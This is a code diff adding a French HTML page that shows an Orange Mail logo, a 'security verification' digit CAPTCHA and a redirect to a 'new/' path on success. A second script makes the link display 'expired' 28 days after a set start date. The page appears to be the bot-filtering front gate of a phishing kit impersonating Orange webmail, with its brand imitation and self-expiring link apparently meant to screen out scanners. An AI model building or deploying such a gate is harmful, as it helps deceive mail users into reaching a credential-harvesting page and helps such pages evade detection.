@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <title>CAPTCHA Visuel</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+      display: flex;
+      height: 100vh;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    canvas {
+      margin: 15px 0;
+      border-radius: 8px;
+      box-shadow: 0 0 6px rgba(0,0,0,0.2);
+    }
+
+    input[type="text"] {
+      padding: 10px;
+      width: 150px;
+      font-size: 1.2em;
+      margin-bottom: 10px;
+    }
+
+    button {
+      padding: 10px 20px;
+      background: #ff7900;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .error {
+      color: red;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <img src="img/Orange-Mail.jpg" width="100"/>
+  <h2>Vérification de sécurité</h2>
+  <p>Recopiez les 4 chiffres affichés :</p>
+  <canvas id="captchaCanvas" width="200" height="60"></canvas>
+  <form id="captchaForm">
+    <input type="text" id="userInput" maxlength="4" placeholder="1234" required />
+    <br />
+    <button type="submit">Valider</button>
+  </form>
+  <div id="error" class="error"></div>
+</div>
+
+<script>
+  let generatedCode = "";
+
+  function drawCaptcha() {
+    const canvas = document.getElementById("captchaCanvas");
+    const ctx = canvas.getContext("2d");
+
+    // Charger une image de fond
+    const background = new Image();
+    background.src = "img/captcha-bg.png"; // Remplace par ton image (même dossier)
+
+    background.onload = function () {
+      ctx.drawImage(background, 0, 0, canvas.width, canvas.height);
+
+      // Générer 4 chiffres aléatoires
+      generatedCode = "";
+      for (let i = 0; i < 4; i++) {
+        generatedCode += Math.floor(Math.random() * 10);
+      }
+
+      // Style des chiffres
+      ctx.font = "30px Arial";
+      ctx.fillStyle = "#000";
+      ctx.textBaseline = "middle";
+
+      // Afficher les chiffres avec légère variation
+      for (let i = 0; i < 4; i++) {
+        const x = 20 + i * 40;
+        const y = 30 + Math.random() * 10 - 5;
+        ctx.fillText(generatedCode[i], x, y);
+      }
+    };
+  }
+
+  drawCaptcha();
+
+  document.getElementById("captchaForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+    const input = document.getElementById("userInput").value.trim();
+    const error = document.getElementById("error");
+
+    if (input === generatedCode) {
+	 localStorage.setItem('valide', 'true');
+      window.location.href = "new/";
+      // Ici tu peux rediriger vers la page sécurisée
+      // window.location.href = "page-securisee.html";
+    } else {
+      error.textContent = "❌ Code incorrect. Réessayez.";
+      drawCaptcha();
+      document.getElementById("userInput").value = "";
+    }
+  });
+</script>
+<script>
+// Date de début : 8 juin 2025
+const startDate = new Date('2025-06-12T00:00:00');
+
+// Délai d’expiration en jours
+const expirationDays = 28;
+
+// Vérifie si le lien a expiré
+function isLinkExpired() {
+  const now = new Date();
+  const timeDiff = now - startDate;
+  const daysPassed = timeDiff / (1000 * 60 * 60 * 24);
+  return daysPassed >= expirationDays;
+}
+
+// Affiche un message d’expiration avec style percutant
+function showExpirationMessage() {
+  if (isLinkExpired()) {
+    // Supprimer tout le contenu de la page
+    document.body.innerHTML = '';
+
+    // Créer le conteneur du message
+    const messageDiv = document.createElement('div');
+    messageDiv.innerHTML = `
+      <h1>⚠️ Le lien a expiré</h1>
+      <p>Veuillez contacter l’administrateur du site pour plus d’informations.</p>
+    `;
+
+    // Style impactant
+    Object.assign(messageDiv.style, {
+      position: 'fixed',
+      top: '0',
+      left: '0',
+      width: '100vw',
+      height: '100vh',
+      display: 'flex',
+      flexDirection: 'column',
+      justifyContent: 'center',
+      alignItems: 'center',
+      backgroundColor: '#1a1a1a',
+      color: '#ff4d4f',
+      fontFamily: 'Segoe UI, Arial, sans-serif',
+      fontSize: '24px',
+      textAlign: 'center',
+      padding: '40px',
+      boxSizing: 'border-box',
+      zIndex: '9999',
+    });
+
+    // Style du titre
+    messageDiv.querySelector('h1').style.fontSize = '36px';
+    messageDiv.querySelector('h1').style.marginBottom = '20px';
+    messageDiv.querySelector('p').style.color = '#ffffff';
+
+    // Afficher sur la page
+    document.body.appendChild(messageDiv);
+  }
+}
+
+// Lancer au chargement de la page
+window.onload = showExpirationMessage;
+</script>
+
+</body>
+</html>
